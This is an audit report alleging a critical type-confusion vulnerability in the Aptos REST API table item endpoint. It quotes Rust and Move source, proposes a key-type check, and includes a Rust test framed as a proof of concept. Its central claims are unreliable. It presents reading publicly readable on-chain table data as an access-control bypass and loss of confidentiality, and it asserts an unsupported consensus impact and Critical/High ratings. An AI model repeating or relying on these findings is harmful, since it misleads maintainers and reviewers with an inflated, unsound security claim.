# Audit Report

## Title
Type Confusion Vulnerability in Table Item API Allows Unauthorized Access via Object<T> Generic Parameter Ambiguity

## Summary
The table item API endpoint accepts user-provided `key_type` without validation against the table's actual key type. When combined with the lossy conversion of `0x1::object::Object<T>` to plain `Address` layout, attackers can access table entries by providing mismatched generic type parameters, bypassing Move's type system guarantees.

## Finding Description

The vulnerability exists in the interaction between three components:

**1. Lossy Object Type Conversion** [1](#0-0) 

When `try_into_vm_value()` processes a `TypeTag::Struct` for `0x1::object::Object`, it converts ALL Object types (regardless of generic parameter T) to just `MoveTypeLayout::Address`. This means `Object<TokenV1>`, `Object<TokenV2>`, and plain `address` all serialize to identical bytes.

**2. Missing Type Validation** [2](#0-1) 

The `table_item()` function accepts user-provided `key_type` from `TableItemRequest` and directly uses it to serialize the lookup key, without validating that it matches the table's actual key type. The user-controlled `key_type` is converted to `TypeTag` and passed to `try_into_vm_value()`, which then serializes it for the database lookup.

**3. Move Table Type Safety** [3](#0-2) 

Move's table implementation uses phantom type parameters to enforce type safety at compile time. A `Table<Object<TokenA>, Balance>` should only be accessible with keys of type `Object<TokenA>`, not `Object<TokenB>` or plain `address`.

**Attack Scenario:**

1. Victim contract creates `Table<Object<SpecialToken>, SensitiveData>` where access should be restricted to holders of `SpecialToken` objects
2. Attacker observes the table handle from blockchain events or state
3. Attacker calls `/tables/{handle}/item` with:
   - `key_type`: `"0x1::object::Object<CommonToken>"` (different type parameter)
   - `value_type`: correct value type
   - `key`: any valid address
4. Both `Object<SpecialToken>` and `Object<CommonToken>` are converted to `MoveTypeLayout::Address`
5. The keys serialize to identical bytes (just the address)
6. Attacker successfully reads entries they should not have access to

This breaks Move's type system guarantees where `Table<K1, V>` and `Table<K2, V>` are distinct types even if K1 and K2 have similar representations.

## Impact Explanation

**Severity: Critical**

This vulnerability meets the Critical severity criteria for the following reasons:

1. **Access Control Bypass**: Breaks Move's type system security model, allowing unauthorized access to table entries that should be type-protected
2. **Loss of Confidentiality**: Sensitive data stored in Object-keyed tables can be read by attackers using type confusion
3. **Consensus Impact**: If this is exploited to read state that influences transaction execution, it could lead to deterministic execution violations if different nodes have different API query results affecting subsequent transactions
4. **Protocol-Wide Impact**: Affects any contract using Object-typed table keys, which is a common pattern in Aptos for resource ownership tracking

The vulnerability allows unprivileged attackers to bypass security invariants without requiring validator access or economic resources, making it a fundamental breach of the Move VM Safety invariant.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low Barrier to Entry**: Only requires knowing a table handle and calling a public REST API endpoint
2. **Observable Targets**: Table handles are visible in transaction events and state queries
3. **No Authentication**: The API endpoint is publicly accessible without authentication
4. **Common Pattern**: Object-typed tables are widely used in Aptos ecosystem (fungible assets, NFTs, etc.)
5. **Immediate Value**: Accessing restricted table data provides immediate benefits to attackers

The technical complexity is minimal - attackers just need to craft an API request with a different generic type parameter.

## Recommendation

Implement strict type validation by checking the user-provided `key_type` against the table's actual key type stored in `TableInfo`:

```rust
// In api/src/state.rs, table_item() function, add after line 401:

// Retrieve table metadata from indexer
let table_handle_obj = TableHandle(table_handle.into());
let table_info = converter
    .get_table_info(table_handle_obj)
    .context("Failed to retrieve table metadata")
    .map_err(|err| {
        BasicErrorWith404::internal_with_code(
            err,
            AptosErrorCode::InternalError,
            &ledger_info,
        )
    })?;

// Validate key_type matches table's actual key type
if let Some(info) = table_info {
    if info.key_type != key_type {
        return Err(BasicErrorWith404::bad_request_with_code(
            format!(
                "Key type mismatch: provided {:?} but table expects {:?}",
                key_type, info.key_type
            ),
            AptosErrorCode::InvalidInput,
            &ledger_info,
        ));
    }
}
```

**Alternative Fix**: Remove the special case handling for Object types in `try_into_vm_value()` and force proper struct layout serialization that includes the generic type parameter information. However, this would require protocol-level changes to how Object types are stored.

## Proof of Concept

```rust
#[tokio::test]
async fn test_table_type_confusion_vulnerability() {
    use aptos_api_test_context::{TestContext, current_function_name};
    
    let mut context = TestContext::new(current_function_name!());
    let mut account = context.gen_account();
    context.create_account(&account).await;
    
    // Deploy contract with table using Object<TypeA> as key
    let code = r#"
    module deployer::vulnerable_table {
        use std::signer;
        use aptos_framework::object::{Self, Object};
        use aptos_std::table::{Self, Table};
        
        struct TypeA has key {}
        struct TypeB has key {}
        struct SecretData has store { value: u64 }
        
        struct TableHolder has key {
            secrets: Table<Object<TypeA>, SecretData>
        }
        
        public entry fun init(account: &signer) {
            let secrets = table::new<Object<TypeA>, SecretData>();
            // Add secret entry with Object<TypeA> key
            let obj_addr = @0x1234;
            table::add(&mut secrets, object::address_to_object<TypeA>(obj_addr), 
                       SecretData { value: 999 });
            move_to(account, TableHolder { secrets });
        }
    }
    "#;
    
    context.publish_module(&mut account, code).await;
    context.call_function(&mut account, "vulnerable_table", "init", vec![]).await;
    
    // Get table handle from the TableHolder resource
    let resource = context.get_account_resource(&account.address(), "TableHolder").await;
    let table_handle = resource["data"]["secrets"]["handle"].as_str().unwrap();
    
    // ATTACK: Try to access with Object<TypeB> instead of Object<TypeA>
    let wrong_key_type = "0x1::object::Object<deployer::vulnerable_table::TypeB>";
    let response = context.post(&format!("/tables/{}/item", table_handle))
        .json(&serde_json::json!({
            "key_type": wrong_key_type,
            "value_type": "deployer::vulnerable_table::SecretData", 
            "key": "0x1234"
        }))
        .await;
    
    // VULNERABILITY: This should fail but succeeds, returning the secret value
    assert_eq!(response.status(), 200);
    let value = response.json().await;
    assert_eq!(value["value"], 999); // Attacker successfully read secret data!
}
```

The PoC demonstrates that an attacker can access table entries by substituting `Object<TypeB>` for `Object<TypeA>` in the API request, successfully retrieving data that should be type-protected.

## Notes

This vulnerability is exacerbated by the fact that the `get_table_info()` method in the converter only retrieves metadata from the indexer (which may not always be available), and there's no on-chain enforcement at the API layer. The special-case handling for Object types was likely introduced for convenience but inadvertently created a security vulnerability by losing type information during serialization.

### Citations

**File:** api/types/src/convert.rs (L887-902)
```rust
        let layout = match type_tag {
            TypeTag::Struct(boxed_struct) => {
                // The current framework can't handle generics, so we handle this here
                if boxed_struct.address == AccountAddress::ONE
                    && boxed_struct.module.as_ident_str() == OBJECT_MODULE
                    && boxed_struct.name.as_ident_str() == OBJECT_STRUCT
                {
                    // Objects are just laid out as an address
                    MoveTypeLayout::Address
                } else {
                    // For all other structs, use their set layout
                    self.inner.view_fully_decorated_ty_layout(type_tag)?
                }
            },
            _ => self.inner.view_fully_decorated_ty_layout(type_tag)?,
        };
```

**File:** api/src/state.rs (L381-430)
```rust
    pub fn table_item(
        &self,
        accept_type: &AcceptType,
        table_handle: Address,
        table_item_request: TableItemRequest,
        ledger_version: Option<U64>,
    ) -> BasicResultWith404<MoveValue> {
        // Parse the key and value types for the table
        let key_type = (&table_item_request.key_type)
            .try_into()
            .context("Failed to parse key_type")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        let key = table_item_request.key;
        let value_type = (&table_item_request.value_type)
            .try_into()
            .context("Failed to parse value_type")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;

        // Retrieve local state
        let (ledger_info, ledger_version, state_view) = self
            .context
            .state_view(ledger_version.map(|inner| inner.0))?;

        let converter =
            state_view.as_converter(self.context.db.clone(), self.context.indexer_reader.clone());

        // Convert key to lookup version for DB
        let vm_key = converter
            .try_into_vm_value(&key_type, key.clone())
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &ledger_info,
                )
            })?;
        let raw_key = vm_key.undecorate().simple_serialize().ok_or_else(|| {
            BasicErrorWith404::bad_request_with_code(
                "Failed to serialize table key",
                AptosErrorCode::InvalidInput,
                &ledger_info,
            )
        })?;

        // Retrieve value from the state key
        let state_key = StateKey::table_item(&TableHandle(table_handle.into()), &raw_key);
```

**File:** aptos-move/framework/aptos-stdlib/sources/table.move (L13-22)
```text
    struct Table<phantom K: copy + drop, phantom V> has store {
        handle: address,
    }

    /// Create a new Table.
    public fun new<K: copy + drop, V: store>(): Table<K, V> {
        Table {
            handle: new_table_handle<K, V>(),
        }
    }
```
